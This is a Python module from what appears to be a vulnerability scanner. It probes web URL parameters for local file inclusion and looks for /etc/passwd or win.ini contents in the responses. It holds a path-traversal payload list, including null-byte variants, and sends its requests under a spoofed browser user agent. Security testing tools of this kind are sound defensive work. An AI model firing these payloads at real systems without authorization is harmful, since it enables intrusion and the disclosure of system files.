import logging
import re
import urllib.parse
from typing import List

import requests

from core.scanner_types import ScannerModule, Target, Vulnerability
from core.models import Severity

logger = logging.getLogger("VulnSeeker")
UA_BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"


class LFIScanner(ScannerModule):
    @property
    def name(self) -> str:
        return "Local File Inclusion (LFI)"

    @property
    def description(self) -> str:
        return "Detecta inclusión de archivos locales (etc/passwd, win.ini, boot.ini)."

    def run(self, target: Target) -> List[Vulnerability]:
        vulns: List[Vulnerability] = []
        payloads = [
            "../../../../etc/passwd",
            "/etc/passwd",
            "../../../../../../../../etc/passwd",
            "../../../../windows/win.ini",
            "../../../../boot.ini",
            "../../etc/passwd%00",
            "/etc/passwd%00",
            "../../../../windows/win.ini%00",
            "../../../../boot.ini%00",
        ]
        common_params = ["page", "file", "doc", "view", "include", "content"]

        parsed = urllib.parse.urlparse(target.url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        targets_to_test = []

        if params:
            for key in params:
                for payload in payloads:
                    new_params = params.copy()
                    new_params[key] = payload
                    new_query = urllib.parse.urlencode(new_params, doseq=True)
                    new_url = parsed._replace(query=new_query).geturl()
                    targets_to_test.append((new_url, key, payload))
        else:
            base = target.url.rstrip("/")
            for p in common_params:
                for payload in payloads:
                    new_url = f"{base}/?{p}={urllib.parse.quote(payload, safe='/%')}"
                    targets_to_test.append((new_url, p, payload))

        for test_url, param_name, payload in targets_to_test:
            try:
                logger.info(f"📂 LFI Scanner: probando {test_url}")
                resp = requests.get(test_url, timeout=6, headers={"User-Agent": UA_BROWSER}, allow_redirects=True)
                body = resp.text or ""
                if re.search(r"root:x:0:0:", body, re.IGNORECASE) or re.search(r"\[(extensions|fonts)\]", body,
                                                                              re.IGNORECASE):
                    evidence = body[:50].replace("\n", " ").replace("\r", " ")
                    vulns.append(Vulnerability(
                        name="Local File Inclusion (LFI)",
                        description=f"Parámetro vulnerable: {param_name}",
                        severity=Severity.CRITICAL,
                        target_url=test_url,
                        payload=payload + f" | evidencia: {evidence}"
                    ))
                    break
            except Exception as e:
                logger.debug(f"LFI Scanner error en {test_url}: {e}")
                continue

        return vulns
